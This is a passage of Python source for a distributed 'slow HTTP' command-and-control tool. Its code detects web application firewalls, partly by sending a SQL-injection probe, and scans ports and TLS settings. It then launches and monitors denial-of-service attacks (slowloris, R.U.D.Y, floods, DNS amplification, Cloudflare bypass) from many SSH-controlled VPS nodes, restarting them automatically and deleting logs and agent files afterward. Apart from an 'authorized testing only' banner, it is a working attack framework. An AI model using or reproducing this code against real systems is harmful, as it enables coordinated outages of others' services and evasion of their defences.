                            results["evidence"].append(f"{header} header indicates {value}")
                            if "cloudflare" in response.headers[header].lower():
                                results["waf_type"] = "Cloudflare"
                                results["cloudflare_detected"] = True
                            elif "sucuri" in response.headers[header].lower():
                                results["waf_type"] = "Sucuri"
                            elif "incap" in response.headers[header].lower():
                                results["waf_type"] = "Incapsula"
                            elif "akamai" in response.headers[header].lower():
                                results["waf_type"] = "Akamai"
                            elif "f5" in response.headers[header].lower():
                                results["waf_type"] = "F5 BIG-IP"
                            elif "aws" in response.headers[header].lower():
                                results["waf_type"] = "AWS WAF"
            
            # Check cookies for WAF indicators
            if "Set-Cookie" in response.headers:
                cookies = response.headers["Set-Cookie"]
                if "incap_ses" in cookies or "visid_incap" in cookies:
                    results["waf_detected"] = True
                    results["waf_type"] = "Incapsula"
                    results["evidence"].append("Incapsula cookies detected")
                elif "awsalb" in cookies or "awsalbcors" in cookies:
                    results["waf_detected"] = True
                    results["waf_type"] = "AWS WAF/ALB"
                    results["evidence"].append("AWS ALB cookies detected")
                elif "__cfduid" in cookies or "cf_clearance" in cookies:
                    results["waf_detected"] = True
                    results["waf_type"] = "Cloudflare"
                    results["cloudflare_detected"] = True
                    results["evidence"].append("Cloudflare cookies detected")
            
            # Try a malicious request to trigger WAF
            try:
                malicious_url = f"{url}?id=1' OR 1=1 --"
                malicious_response = requests.get(malicious_url, headers=headers, timeout=5)
                
                # Check if response is different (blocked)
                if malicious_response.status_code != response.status_code:
                    results["waf_detected"] = True
                    results["evidence"].append(f"Malicious request returned different status code: {malicious_response.status_code} vs {response.status_code}")
                
                # Check for WAF block page indicators
                block_indicators = [
                    "blocked", "firewall", "security", "waf", "not allowed", "disallowed", 
                    "malicious", "protection", "detected", "attack", "suspicious"
                ]
                
                for indicator in block_indicators:
                    if indicator in malicious_response.text.lower():
                        results["waf_detected"] = True
                        results["evidence"].append(f"Block page indicator found: '{indicator}'")
            except Exception as e:
                # If the malicious request fails but the normal one succeeded, it might be WAF
                results["waf_detected"] = True
                results["evidence"].append(f"Malicious request failed: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error detecting WAF: {str(e)}")
        
        return results
    
    def scan_ports(self, target, port_range):
        """Scan ports on target host"""
        results = {
            "target": target,
            "open_ports": [],
            "scan_time": 0
        }
        
        # Parse port range
        ports_to_scan = []
        if "-" in port_range:
            start, end = port_range.split("-")
            ports_to_scan = range(int(start), int(end) + 1)
        else:
            ports_to_scan = [int(p) for p in port_range.split(",")]
        
        # Start timer
        start_time = time.time()
        
        # Common service names
        common_services = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            110: "POP3",
            143: "IMAP",
            443: "HTTPS",
            465: "SMTPS",
            587: "SMTP",
            993: "IMAPS",
            995: "POP3S",
            3306: "MySQL",
            3389: "RDP",
            5432: "PostgreSQL",
            8080: "HTTP-Proxy",
            8443: "HTTPS-Alt"
        }
        
        # Scan ports
        for port in ports_to_scan:
            try:
                # Create socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                
                # Try to connect
                result = s.connect_ex((target, port))
                
                # If port is open
                if result == 0:
                    # Try to get banner
                    banner = None
                    try:
                        s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                        banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
                    except:
                        pass
                    
                    # Get service name
                    service = common_services.get(port, "unknown")
                    
                    # Add to results
                    results["open_ports"].append({
                        "port": port,
                        "service": service,
                        "banner": banner
                    })
                
                # Close socket
                s.close()
                
            except Exception as e:
                logger.debug(f"Error scanning port {port}: {str(e)}")
        
        # End timer
        end_time = time.time()
        results["scan_time"] = end_time - start_time
        
        return results
    
    def get_ssl_info(self, target, port=443):
        """Get SSL/TLS information for target"""
        results = {
            "target": target,
            "port": port,
            "has_ssl": False,
            "subject": None,
            "issuer": None,
            "version": None,
            "serial_number": None,
            "not_before": None,
            "not_after": None,
            "is_expired": None,
            "days_left": None,
            "protocols": {
                "SSLv2": False,
                "SSLv3": False,
                "TLSv1.0": False,
                "TLSv1.1": False,
                "TLSv1.2": False,
                "TLSv1.3": False
            },
            "cipher_suites": [],
            "security_checks": {
                "heartbleed": {"pass": True, "message": ""},
                "poodle": {"pass": True, "message": ""},
                "freak": {"pass": True, "message": ""},
                "logjam": {"pass": True, "message": ""},
                "beast": {"pass": True, "message": ""},
                "sweet32": {"pass": True, "message": ""}
            },
            "error": None
        }
        
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            # Connect to target
            sock.connect((target, port))
            
            # Wrap with SSL
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Try to establish SSL connection
            ssl_sock = context.wrap_socket(sock, server_hostname=target)
            
            # Get certificate
            cert = ssl_sock.getpeercert(True)
            x509 = ssl.DER_cert_to_PEM_cert(cert)
            
            # Mark as having SSL
            results["has_ssl"] = True
            
            # Extract certificate information
            # This is a simplified version - in a real implementation, you'd use a library like cryptography
            # to properly parse the certificate
            
            # Extract subject
            subject_start = x509.find("/CN=")
            if subject_start != -1:
                subject_end = x509.find("\n", subject_start)
                results["subject"] = x509[subject_start + 4:subject_end].strip()
            
            # Extract issuer
            issuer_start = x509.find("Issuer: ")
            if issuer_start != -1:
                issuer_end = x509.find("\n", issuer_start)
                results["issuer"] = x509[issuer_start + 8:issuer_end].strip()
            
            # Extract validity
            not_before_start = x509.find("Not Before: ")
            if not_before_start != -1:
                not_before_end = x509.find("\n", not_before_start)
                results["not_before"] = x509[not_before_start + 12:not_before_end].strip()
            
            not_after_start = x509.find("Not After : ")
            if not_after_start != -1:
                not_after_end = x509.find("\n", not_after_start)
                results["not_after"] = x509[not_after_start + 12:not_after_end].strip()
            
            # Check if expired
            if results["not_after"]:
                try:
                    # Parse date
                    not_after = datetime.strptime(results["not_after"], "%b %d %H:%M:%S %Y %Z")
                    now = datetime.now()
                    
                    # Check if expired
                    results["is_expired"] = now > not_after
                    
                    # Calculate days left
                    days_left = (not_after - now).days
                    results["days_left"] = days_left
                except Exception as e:
                    logger.debug(f"Error parsing certificate date: {str(e)}")
            
            # Check supported protocols
            protocols = [
                ("SSLv3", ssl.PROTOCOL_SSLv23),
                ("TLSv1.0", ssl.PROTOCOL_TLSv1),
                ("TLSv1.1", ssl.PROTOCOL_TLSv1_1),
                ("TLSv1.2", ssl.PROTOCOL_TLSv1_2)
            ]
            
            for protocol_name, protocol in protocols:
                try:
                    protocol_context = ssl.SSLContext(protocol)
                    protocol_context.check_hostname = False
                    protocol_context.verify_mode = ssl.CERT_NONE
                    
                    protocol_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    protocol_sock.settimeout(2)
                    protocol_sock.connect((target, port))
                    
                    protocol_ssl_sock = protocol_context.wrap_socket(protocol_sock, server_hostname=target)
                    protocol_ssl_sock.close()
                    
                    results["protocols"][protocol_name] = True
                    
                    # Security checks
                    if protocol_name == "SSLv3":
                        results["security_checks"]["poodle"]["pass"] = False
                        results["security_checks"]["poodle"]["message"] = "SSLv3 is vulnerable to POODLE attack"
                    
                    if protocol_name in ["TLSv1.0", "TLSv1.1"]:
                        results["security_checks"]["beast"]["pass"] = False
                        results["security_checks"]["beast"]["message"] = f"{protocol_name} is potentially vulnerable to BEAST attack"
                    
                except:
                    pass
            
            # Get cipher suites
            try:
                # This is a simplified approach - in a real implementation, you'd use a library like cryptography
                # to properly enumerate supported cipher suites
                cipher = ssl_sock.cipher()
                if cipher:
                    results["cipher_suites"].append(f"{cipher[0]} - {cipher[1]} bits - {cipher[2]}")
                
                # Check for weak ciphers
                if "RC4" in str(cipher) or "DES" in str(cipher):
                    results["security_checks"]["sweet32"]["pass"] = False
                    results["security_checks"]["sweet32"]["message"] = "Weak cipher detected"
            except:
                pass
            
            # Close connection
            ssl_sock.close()
            
        except Exception as e:
            results["error"] = str(e)
        
        return results

class TerminalHelper:
    """Helper class for terminal UI operations"""
    
    def __init__(self):
        """Initialize terminal helper"""
        self.last_progress = 0
    
    def clear_screen(self):
        """Clear the terminal screen"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self, version):
        """Print the application banner"""
        banner = f"""{Colors.CYAN}{Colors.BOLD}
╔════════════════════════════════════════════════════════════════════════════╗
║                    DISTRIBUTED SLOW HTTP TESTING C2                         ║
║                         ADVANCED EDITION v{version}                              ║
╚════════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}
{Colors.RED}{Colors.BOLD}⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️{Colors.RESET}
{Colors.RED}   Unauthorized use against systems you don't own is ILLEGAL!{Colors.RESET}
"""
        print(banner)
    
    def input_with_prompt(self, prompt, required=True, validate_func=None):
        """Get user input with validation"""
        while True:
            try:
                value = input(f"{Colors.CYAN}{prompt}{Colors.RESET}").strip()
                
                if not required and not value:
                    return value
                
                if required and not value:
                    print(f"{Colors.RED}This field is required{Colors.RESET}")
                    continue
                
                if validate_func:
                    if isinstance(validate_func, tuple):
                        # Unpack function and error message
                        func, error_msg = validate_func
                        valid = func(value)
                        if not valid:
                            print(f"{Colors.RED}{error_msg}{Colors.RESET}")
                            continue
                    else:
                        # Just a function that returns True/False
                        valid = validate_func(value)
                        if not valid:
                            print(f"{Colors.RED}Invalid input{Colors.RESET}")
                            continue
                
                return value
            except KeyboardInterrupt:
                return None
    
    def print_progress_bar(self, iteration, total, prefix='', suffix='', length=50, fill='█'):
        """Print a progress bar"""
        percent = ("{0:.1f}").format(100 * (iteration / float(total)))
        filled_length = int(length * iteration // total)
        bar = fill * filled_length + '-' * (length - filled_length)
        print(f'\r{prefix} |{bar}| {percent}% {suffix}', end='\r')
        
        # Print New Line on Complete
        if iteration == total:
            print()
    
    def print_table(self, headers, data, padding=2):
        """Print a formatted table"""
        if not data:
            return
        
        # Calculate column widths
        col_widths = [len(h) for h in headers]
        for row in data:
            for i, cell in enumerate(row):
                if i < len(col_widths):
                    col_widths[i] = max(col_widths[i], len(str(cell)))
        
        # Add padding
        col_widths = [w + padding for w in col_widths]
        
        # Print headers
        header_row = ""
        for i, header in enumerate(headers):
            header_row += f"{Colors.BOLD}{header}{Colors.RESET}".ljust(col_widths[i])
        print(header_row)
        
        # Print separator
        print("-" * sum(col_widths))
        
        # Print data
        for row in data:
            row_str = ""
            for i, cell in enumerate(row):
                if i < len(col_widths):
                    # Handle ANSI color codes in cell content
                    if isinstance(cell, str) and (Colors.RED in cell or Colors.GREEN in cell or Colors.YELLOW in cell):
                        # For colored cells, we need to account for the invisible ANSI codes
                        visible_len = len(cell) - (len(Colors.RED) + len(Colors.RESET))
                        row_str += f"{cell}".ljust(col_widths[i] + (len(Colors.RED) + len(Colors.RESET)))
                    else:
                        row_str += f"{cell}".ljust(col_widths[i])
            print(row_str)
    
    def print_status(self, message, status, success_word="SUCCESS", failure_word="FAILED"):
        """Print a status message with colored status indicator"""
        if status:
            status_str = f"{Colors.GREEN}{success_word}{Colors.RESET}"
        else:
            status_str = f"{Colors.RED}{failure_word}{Colors.RESET}"
        
        print(f"{message} [{status_str}]")
    
    def confirm_action(self, prompt):
        """Ask for confirmation before proceeding"""
        response = input(f"{Colors.YELLOW}{prompt} (y/N): {Colors.RESET}").strip().lower()
        return response == 'y'

class AttackManager:
    """Manages attack operations across VPS nodes"""
    
    def __init__(self, ssh_manager, db_manager):
        """Initialize attack manager with SSH and database managers"""
        self.ssh_manager = ssh_manager
        self.db_manager = db_manager
        self.active_attacks = {}
        self.monitoring_threads = {}
    
    def get_available_attack_methods(self):
        """Get available attack methods"""
        return {
            'slowloris': 'Slowloris (Keep-Alive)',
            'slow_post': 'R.U.D.Y (Slow POST)',
            'slow_read': 'Slow Read',
            'http_flood': 'HTTP Flood',
            'ssl_exhaust': 'SSL Exhaustion',
            'tcp_flood': 'TCP Flood',
            'land': 'LAND Attack',
            'dns_amplification': 'DNS Amplification',
            'cloudflare_bypass': 'Cloudflare Bypass Attack'
        }
    
    def launch_attack(self, session_id, target_url, attack_type, vps_list, parameters):
        """Launch attack with comprehensive error handling and auto-reconnect"""
        
        # Parse target URL properly with robust handling
        try:
            if not target_url.startswith('http'):
                target_url = 'http://' + target_url
            
            parsed = urlparse(target_url)
            target_host = parsed.hostname or parsed.netloc.split(':')[0]
            target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            use_ssl = parsed.scheme == 'https'
            
            # Validate target host
            if not target_host:
                logger.error(f"Invalid target URL: {target_url}")
                print(f"{Colors.RED}[ERROR] Invalid target URL{Colors.RESET}")
                return False
                
        except Exception as e:
            logger.error(f"Error parsing target URL: {str(e)}")
            print(f"{Colors.RED}[ERROR] Failed to parse target URL: {str(e)}{Colors.RESET}")
            return False
        
        self.active_attacks[session_id] = {
            'target_host': target_host,
            'target_url': target_url,
            'attack_type': attack_type,
            'vps_list': vps_list,
            'status': 'running',
            'start_time': datetime.now(),
            'parameters': parameters,
            'use_ssl': use_ssl
        }
        
        logger.info(f"Launching {attack_type} attack on {target_host}")
        print(f"\n{Colors.YELLOW}[ATTACK] Launching {attack_type} attack on {target_host}{Colors.RESET}")
        print(f"{Colors.CYAN}[CONFIG] VPS nodes: {len(vps_list)} | Connections per VPS: {parameters.get('connections', 100)}{Colors.RESET}")
        
        # Get all VPS data from database for reconnection
        all_vps_data = {vps['ip_address']: vps for vps in self.db_manager.get_all_vps()}
        
        # Pre-validate and reconnect all VPS in parallel
        print(f"\n{Colors.YELLOW}[VALIDATING] Checking VPS connections...{Colors.RESET}")
        valid_vps = []
        invalid_vps = []
        
        def validate_vps(vps_ip):
            """Validate and reconnect VPS if needed"""
            if self.ssh_manager.get_connection_status(vps_ip):
                return vps_ip, True, "Already connected"
            
            vps_data = all_vps_data.get(vps_ip)
            if vps_data:
                success, msg = self.ssh_manager.connect_vps(
                    vps_data['ip_address'], vps_data['username'], 
                    vps_data['password'], vps_data['ssh_port']
                )
                return vps_ip, success, msg
            return vps_ip, False, "VPS data not found"
        
        # Validate all VPS in parallel using ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=min(len(vps_list), 10)) as executor:
            validation_results = list(executor.map(validate_vps, vps_list))
        
        for vps_ip, success, msg in validation_results:
            if success:
                valid_vps.append(vps_ip)
                self.db_manager.update_vps_status(vps_ip, 'online')
            else:
                invalid_vps.append(f"{vps_ip}: {msg}")
        
        if not valid_vps:
            print(f"{Colors.RED}[ERROR] No valid VPS connections available{Colors.RESET}")
            self.db_manager.update_attack_status(session_id, 'failed', json.dumps({"errors": invalid_vps}))
            return False
        
        if invalid_vps:
            print(f"{Colors.YELLOW}[WARNING] {len(invalid_vps)} VPS unavailable{Colors.RESET}")
        
        print(f"{Colors.GREEN}[VALIDATED] {len(valid_vps)} VPS ready for attack{Colors.RESET}\n")
        
        # Launch attack on all VPS in parallel
        success_count = 0
        failed_vps = []
        
        def launch_on_vps(vps_ip):
            """Launch attack on a single VPS"""
            try:
                # Build attack command
                cmd = self._build_attack_command(target_url, attack_type, parameters)
                
                # Execute with longer timeout
                success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=45)
                
                if success:
                    # Start monitoring thread for this VPS
                    self._start_monitoring_thread(session_id, vps_ip)
                    return vps_ip, True, "Launched"
                else:
                    return vps_ip, False, output
            except Exception as e:
                return vps_ip, False, str(e)
        
        # Launch on all VPS in parallel
        print(f"{Colors.CYAN}[LAUNCHING] Starting attack on all VPS simultaneously...{Colors.RESET}\n")
        with ThreadPoolExecutor(max_workers=min(len(valid_vps), 20)) as executor:
            launch_results = list(executor.map(launch_on_vps, valid_vps))
        
        for vps_ip, success, msg in launch_results:
            print(f"{Colors.CYAN}[{vps_ip}]{Colors.RESET} ", end="", flush=True)
            if success:
                print(f"{Colors.GREEN}LAUNCHED{Colors.RESET}")
                success_count += 1
            else:
                print(f"{Colors.RED}FAILED - {msg[:50]}{Colors.RESET}")
                failed_vps.append(f"{vps_ip}: {msg}")
        
        # Update attack status in database
        if success_count > 0:
            self.db_manager.update_attack_status(session_id, 'running')
            
            # Start a thread to monitor the attack duration
            duration = parameters.get('duration', 300)  # Default 5 minutes
            threading.Thread(target=self._monitor_attack_duration, args=(session_id, duration), daemon=True).start()
            
            print(f"\n{Colors.GREEN}[SUCCESS] Attack launched on {success_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
            
            if failed_vps:
                print(f"\n{Colors.YELLOW}[WARNING] Failed to launch on {len(failed_vps)} VPS nodes:{Colors.RESET}")
                for failure in failed_vps:
                    print(f"  - {failure}")
            
            return True
        else:
            self.db_manager.update_attack_status(session_id, 'failed', json.dumps({"errors": failed_vps}))
            print(f"\n{Colors.RED}[ERROR] Failed to launch attack on any VPS nodes{Colors.RESET}")
            return False
    
    def _build_attack_command(self, target_url, attack_type, parameters):
        """Build the attack command to execute on VPS with proper sanitization"""
        import shlex
        
        # Sanitize inputs to prevent command injection
        safe_target = shlex.quote(target_url)
        safe_attack_type = shlex.quote(attack_type)
        
        # Check if agent exists first, then build command
        cmd = "cd ~/slowhttp_agent 2>/dev/null || (echo 'Agent not deployed' >&2 && exit 1) && "
        cmd += "nohup python3 agent.py "
        
        # Add target with sanitization
        cmd += f"--target {safe_target} "
        
        # Add attack type with sanitization
        cmd += f"--attack-type {safe_attack_type} "
        
        # Add common parameters
        connections = parameters.get('connections', 100)
        cmd += f"--connections {connections} "
        
        # Handle unlimited duration
        duration = parameters.get('duration', 300)
        if duration == 0 or duration == -1:
            # Unlimited duration - set to very high value
            cmd += "--duration 999999999 "
        else:
            cmd += f"--duration {duration} "
        
        # Add attack-specific parameters
        if attack_type in ['slowloris', 'slow_post', 'slow_read', 'ssl_exhaust']:
            delay = parameters.get('delay', 10)
            if delay == 0:
                # No delay mode for maximum effectiveness
                cmd += "--delay 0 "
            else:
                cmd += f"--delay {delay} "
        
        if attack_type == 'http_flood':
            requests = parameters.get('requests', 1000)
            cmd += f"--requests {requests} "
        
        if attack_type == 'dns_amplification':
            target_ip = parameters.get('target_ip')
            if target_ip:
                safe_target_ip = shlex.quote(target_ip)
                cmd += f"--target-ip {safe_target_ip} "
        
        if attack_type == "cloudflare_bypass":
            # Cloudflare Bypass attack - no special parameters needed
            cmd += "# Cloudflare Bypass: will attempt to discover origin IP and bypass protection "
        
        # Redirect output to log file and run in background
        timestamp = int(time.time())
        cmd += f"> attack_{attack_type}_{timestamp}.log 2>&1 & echo $!"
        
        return cmd
    
    def _start_monitoring_thread(self, session_id, vps_ip):
        """Start a thread to monitor attack progress on a VPS"""
        if session_id not in self.monitoring_threads:
            self.monitoring_threads[session_id] = {}
        
        # Create and start monitoring thread
        thread = threading.Thread(
            target=self._monitor_attack_vps,
            args=(session_id, vps_ip),
            daemon=True
        )
        thread.start()
        
        self.monitoring_threads[session_id][vps_ip] = thread
    
    def _monitor_attack_vps(self, session_id, vps_ip):
        """Monitor attack progress on a specific VPS"""
        attack_info = self.active_attacks.get(session_id)
        if not attack_info:
            return
        
        # Get monitoring interval based on attack type
        if attack_info['attack_type'] in ['slowloris', 'slow_post', 'slow_read']:
            interval = 10  # Slower attacks need less frequent monitoring
        else:
            interval = 5   # Faster attacks need more frequent monitoring
        
        while session_id in self.active_attacks and self.active_attacks[session_id]['status'] == 'running':
            try:
                # Get attack stats from VPS
                cmd = "cd ~/slowhttp_agent && ps aux | grep agent.py | grep -v grep"
                success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=20)
                
                if not success or not output:
                    # Process not found, attack might have stopped
                    logger.warning(f"Attack process not found on {vps_ip}")
                    
                    # Check if connection is still alive
                    if not self.ssh_manager.get_connection_status(vps_ip):
                        logger.warning(f"Connection lost to {vps_ip}, attempting reconnect...")
                        reconnect_success, msg = self.ssh_manager.reconnect_vps(vps_ip)
                        if not reconnect_success:
                            logger.error(f"Failed to reconnect to {vps_ip}: {msg}")
                            # Add result with error
                            self.db_manager.add_attack_result(
                                session_id, vps_ip, 0, 0, 0, 1, None, None, None, 'error'
                            )
                            time.sleep(interval)
                            continue
                    
                    # Add result with error
                    self.db_manager.add_attack_result(
                        session_id, vps_ip, 0, 0, 0, 1, None, None, None, 'error'
                    )
                    
                    # Try to restart the attack
                    self._attempt_restart_attack(session_id, vps_ip)
                    
                    # Sleep before next check
                    time.sleep(interval)
                    continue
                
                # Get CPU and memory usage
                cmd = "cd ~/slowhttp_agent && ps aux | grep agent.py | grep -v grep | awk '{print $3 &quot; &quot; $4}'"
                success, resource_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=20)
                
                cpu_usage = None
                memory_usage = None
                
                if success and resource_output:
                    parts = resource_output.strip().split()
                    if len(parts) >= 2:
                        try:
                            cpu_usage = float(parts[0])
                            memory_usage = float(parts[1])
                        except ValueError:
                            pass
                
                # Try to get attack stats from log file
                cmd = "cd ~/slowhttp_agent && cat attack_*.log | grep -a 'Status:' | tail -1"
                success, stats_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=20)
                
                connections_active = 0
                packets_sent = 0
                bytes_sent = 0
                error_count = 0
                response_codes = {}
                
                if success and stats_output:
                    # Parse stats from output
                    # Example: "[*] Status: 150 connections active, 1500 packets sent"
                    try:
                        # Extract connections
                        conn_match = re.search(r'(\d+) connections active', stats_output)
                        if conn_match:
                            connections_active = int(conn_match.group(1))
                        
                        # Extract packets
                        packets_match = re.search(r'(\d+) packets sent', stats_output)
                        if packets_match:
                            packets_sent = int(packets_match.group(1))
                        
                        # Extract bytes (if available)
                        bytes_match = re.search(r'(\d+) bytes sent', stats_output)
                        if bytes_match:
                            bytes_sent = int(bytes_match.group(1))
                        
                        # Extract errors (if available)
                        error_match = re.search(r'(\d+) errors', stats_output)
                        if error_match:
                            error_count = int(error_match.group(1))
                        
                        # Extract response codes (if available)
                        codes_match = re.search(r'Response codes: (.*)', stats_output)
                        if codes_match:
                            codes_str = codes_match.group(1)
                            code_parts = codes_str.split(', ')
                            for part in code_parts:
                                code, count = part.split(': ')
                                response_codes[code] = int(count)
                    except Exception as e:
                        logger.error(f"Error parsing stats from {vps_ip}: {str(e)}")
                
                # Add result to database
                self.db_manager.add_attack_result(
                    session_id, vps_ip, connections_active, packets_sent, bytes_sent,
                    error_count, cpu_usage, memory_usage, json.dumps(response_codes), 'running'
                )
                
            except Exception as e:
                logger.error(f"Error monitoring attack on {vps_ip}: {str(e)}")
            
            # Sleep before next check
            time.sleep(interval)
    
    def _attempt_restart_attack(self, session_id, vps_ip):
        """Attempt to restart a failed attack on a VPS"""
        attack_info = self.active_attacks.get(session_id)
        if not attack_info:
            return False
        
        logger.info(f"Attempting to restart attack on {vps_ip}")
        
        # Build attack command
        cmd = self._build_attack_command(
            attack_info['target_url'],
            attack_info['attack_type'],
            attack_info['parameters']
        )
        
        # Execute with longer timeout
        success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=45)
        
        if success:
            logger.info(f"Successfully restarted attack on {vps_ip}")
            return True
        else:
            logger.error(f"Failed to restart attack on {vps_ip}: {output}")
            return False
    
    def _monitor_attack_duration(self, session_id, duration):
        """Monitor attack duration and stop when time is up"""
        logger.info(f"Monitoring attack {session_id} for {duration} seconds")
        
        # Sleep for the duration
        time.sleep(duration)
        
        # Check if attack is still active
        if session_id in self.active_attacks and self.active_attacks[session_id]['status'] == 'running':
            logger.info(f"Attack {session_id} duration reached, stopping")
            self.stop_attack(session_id)
    
    def stop_attack(self, session_id):
        """Stop an attack across all VPS nodes"""
        attack_info = self.active_attacks.get(session_id)
        if not attack_info:
            logger.warning(f"Attack {session_id} not found")
            return False
        
        logger.info(f"Stopping attack {session_id} on {len(attack_info['vps_list'])} VPS nodes")
        print(f"\n{Colors.YELLOW}[STOPPING] Attack {session_id} on {len(attack_info['vps_list'])} VPS nodes{Colors.RESET}")
        
        # Update attack status
        attack_info['status'] = 'stopping'
        
        # Stop attack on each VPS
        for vps_ip in attack_info['vps_list']:
            print(f"{Colors.CYAN}[STOPPING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            # Kill agent.py processes and cleanup
            cmd = "pkill -f 'python3 agent.py' && rm -f ~/slowhttp_agent/attack_*.log"
            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=20)
            
            if success:
                print(f"{Colors.GREEN}STOPPED{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}FAILED{Colors.RESET}")
        
        # Cleanup agent files on all VPS
        print(f"\n{Colors.YELLOW}[CLEANUP] Removing agent files...{Colors.RESET}")
        for vps_ip in attack_info['vps_list']:
            cleanup_cmd = "rm -rf ~/slowhttp_agent"
            self.ssh_manager.execute_command(vps_ip, cleanup_cmd, timeout=20)
        
        # Update attack status in database
        self.db_manager.update_attack_status(session_id, 'completed')
        
        # Remove from active attacks
        if session_id in self.active_attacks:
            del self.active_attacks[session_id]
        
        # Stop monitoring threads
        if session_id in self.monitoring_threads:
            # Threads will terminate on their own when they check active_attacks
            del self.monitoring_threads[session_id]
        
        print(f"\n{Colors.GREEN}[SUCCESS] Attack {session_id} stopped and cleaned up{Colors.RESET}")
        return True
    
    def get_attack_status(self, session_id):
        """Get current status of an attack"""
        attack_info = self.active_attacks.get(session_id)
        if not attack_info:
            # Check database for completed attacks
            session = self.db_manager.get_attack_session(session_id)
            if session:
                return {
                    'status': session['status'],
                    'target_host': session['target_host'],
                    'target_url': session['target_url'],
                    'attack_type': session['attack_type'],
                    'start_time': session['start_time'],
                    'end_time': session['end_time']
                }
            return None
        
        # Get latest results for each VPS
        results = self.db_manager.get_attack_results(session_id)
        
        # Aggregate results
        total_connections = sum(r['connections_active'] for r in results if r['connections_active'] is not None)
        total_packets = sum(r['packets_sent'] for r in results if r['packets_sent'] is not None)
        total_bytes = sum(r['bytes_sent'] for r in results if r['bytes_sent'] is not None)
        total_errors = sum(r['error_count'] for r in results if r['error_count'] is not None)
        
        # Merge response codes
        response_codes = {}
        for result in results:
            if result['response_codes']:
                try:
                    codes = json.loads(result['response_codes'])
                    for code, count in codes.items():
                        if code not in response_codes:
                            response_codes[code] = 0
                        response_codes[code] += count
                except:
                    pass
        
        # Calculate duration
        start_time = attack_info['start_time']
        duration = (datetime.now() - start_time).total_seconds()
        
        return {
            'status': attack_info['status'],
            'target_host': attack_info['target_host'],
            'target_url': attack_info['target_url'],
            'attack_type': attack_info['attack_type'],
            'vps_count': len(attack_info['vps_list']),
            'start_time': start_time.isoformat(),
            'duration': duration,
            'total_connections': total_connections,
            'total_packets': total_packets,
            'total_bytes': total_bytes,
            'total_errors': total_errors,
            'response_codes': response_codes
        }

class SlowHTTPTUI:
    """Terminal User Interface for SlowHTTP C2 tool with improved monitoring"""
    
    def __init__(self):
        """Initialize the TUI with all required components"""
        self.security_manager = SecurityManager()
        self.db_manager = DatabaseManager()
        self.ssh_manager = SSHManager(self.security_manager)
        self.attack_manager = AttackManager(self.ssh_manager, self.db_manager)
        self.network_tools = NetworkTools()
        self.terminal = TerminalHelper()
        self.running = True
        
        # Handle Ctrl+C gracefully
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _signal_handler(self, sig, frame):
        """Handle interrupt signals"""
        print(f"\n{Colors.YELLOW}[EXIT] Shutting down C2 server...{Colors.RESET}")
        
        # Stop all active attacks
        for session_id in list(self.attack_manager.active_attacks.keys()):
            self.attack_manager.stop_attack(session_id)
        
        # Close SSH connections
        for ip in list(self.ssh_manager.connections.keys()):
            self.ssh_manager.disconnect_vps(ip)
        
        # Close database connections
        self.db_manager.close()
        
        self.running = False
        print(f"{Colors.GREEN}Goodbye!{Colors.RESET}")
        sys.exit(0)
    
    def run(self):
        """Main TUI loop"""
        while self.running:
            self.terminal.clear_screen()
            self.terminal.print_banner(VERSION)
            self.print_main_menu()
            
            try:
                choice = input().strip()
                
                if choice == '1':
                    self.vps_management_menu()
                elif choice == '2':
                    self.launch_attack_menu()
                elif choice == '3':
                    self.monitor_attacks_menu()
                elif choice == '4':
                    self.attack_history_menu()
                elif choice == '5':
                    self.network_tools_menu()
                elif choice == '6':
                    self.system_status_menu()
                elif choice == '0':
                    self._signal_handler(None, None)
                else:
                    print(f"{Colors.RED}Invalid option{Colors.RESET}")
                    time.sleep(1)
            except KeyboardInterrupt:
                self._signal_handler(None, None)
            except Exception as e:
                logger.error(f"Error in main loop: {str(e)}")
                logger.error(traceback.format_exc())
                print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
                input("Press Enter to continue...")
    
    def print_main_menu(self):
        """Print the main menu"""
        menu = f"""
{Colors.BOLD}MAIN MENU:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} VPS Management
{Colors.GREEN}[2]{Colors.RESET} Launch Attack
{Colors.GREEN}[3]{Colors.RESET} Monitor Active Attacks  
{Colors.GREEN}[4]{Colors.RESET} Attack History
{Colors.GREEN}[5]{Colors.RESET} Network Reconnaissance Tools
{Colors.GREEN}[6]{Colors.RESET} System Status
{Colors.GREEN}[0]{Colors.RESET} Exit

{Colors.YELLOW}Select option (0-6): {Colors.RESET}"""
        print(menu)
    
    def vps_management_menu(self):
        """VPS management menu"""
        while self.running:
            self.terminal.clear_screen()
            self.terminal.print_banner(VERSION)
            
            vps_list = self.db_manager.get_all_vps()
            
            print(f"{Colors.BOLD}VPS MANAGEMENT{Colors.RESET}")
            print("=" * 50)
            
            if vps_list:
                # Convert to list of lists for table printing
                headers = ["ID", "IP Address", "Username", "Status", "Location", "Last Seen"]
                data = []
                
                for vps in vps_list:
                    status = vps['status']
                    status_str = f"{Colors.GREEN}{status}{Colors.RESET}" if status == 'online' else f"{Colors.RED}{status}{Colors.RESET}"
